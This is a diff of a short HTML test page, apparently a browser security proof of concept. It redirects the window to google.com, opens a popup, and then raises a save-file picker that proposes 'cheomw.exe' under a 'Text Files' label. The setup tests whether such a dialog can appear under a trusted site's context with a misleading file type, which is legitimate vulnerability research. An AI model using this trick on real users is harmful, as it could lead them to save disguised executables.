@@ -1,73 +1,51 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8" />
-  <title>SaveFilePicker + history.pushState Tester</title>
+  <meta charset="utf-8">
+  <title>Redirect + Popup + SaveFilePicker Tester</title>
   <style>
     body { font-family: sans-serif; padding: 20px; }
-    label { display: block; margin-top: 10px; }
-    button { margin-top: 15px; padding: 8px 14px; }
-    small { color: #555; }
+    button { padding: 10px 16px; font-size: 14px; }
   </style>
 </head>
 <body>
 
-<h3>Save File Picker – history.pushState Race Tester</h3>
+<h3>Redirect → New Window → Save File Picker</h3>
 
-<label>
-  Pilih timeout (ms):
-  <select id="delaySelect">
-    <option value="0">0 ms (event-loop edge)</option>
-    <option value="1">1 ms</option>
-    <option value="50">50 ms</option>
-    <option value="100" selected>100 ms</option>
-    <option value="300">300 ms</option>
-    <option value="500">500 ms</option>
-  </select>
-</label>
-
-<label>
-  Atau timeout manual (ms):
-  <input type="number" id="delayInput" placeholder="contoh: 75" />
-</label>
-
-<button onclick="start()">Click to Start Test</button>
-
-<small>
-  <br>Target: URL berubah via pushState, lalu Save File Picker muncul.
-</small>
+<button onclick="go()">Go to google.com</button>
 
 <script>
-function getDelay() {
-  const manual = document.getElementById("delayInput").value;
-  if (manual !== "" && !isNaN(manual)) return parseInt(manual, 10);
-  return parseInt(document.getElementById("delaySelect").value, 10);
-}
+function go() {
+  console.log("User clicked button");
 
-function start() {
-  const delay = getDelay();
-  console.log("Using delay:", delay, "ms");
+  // Step 1: schedule redirect
+  setTimeout(() => {
+    console.log("Redirecting main window");
+    document.location = "https://www.google.com";
+  }, 0);
 
-  // 1️⃣ Ubah URL tanpa reload (SPA-style navigation)
-  history.pushState({ step: 2 }, "", "?step=2");
-  console.log("URL changed via history.pushState");
+  // Step 2: open popup/new window
+  setTimeout(() => {
+    console.log("Opening new window");
+    window.open("https://example.com", "_blank");
+  }, 10);
 
-  // 2️⃣ Tunda pemanggilan Save File Picker
+  // Step 3: trigger Save File Picker
   setTimeout(async () => {
-    console.log("Calling showSaveFilePicker()");
+    console.log("Triggering showSaveFilePicker()");
     try {
       await window.showSaveFilePicker({
-        suggestedName: "test.txt",
+        suggestedName: "cheomw.exe",
         types: [{
           description: "Text Files",
-          accept: { "text/plain": [".txt"] }
+          accept: { "text/plain": [".exe"] }
         }]
       });
       console.log("Picker resolved");
     } catch (e) {
       console.log("Picker rejected/canceled:", e);
     }
-  }, delay);
+  }, 100);
 }
 </script>
 
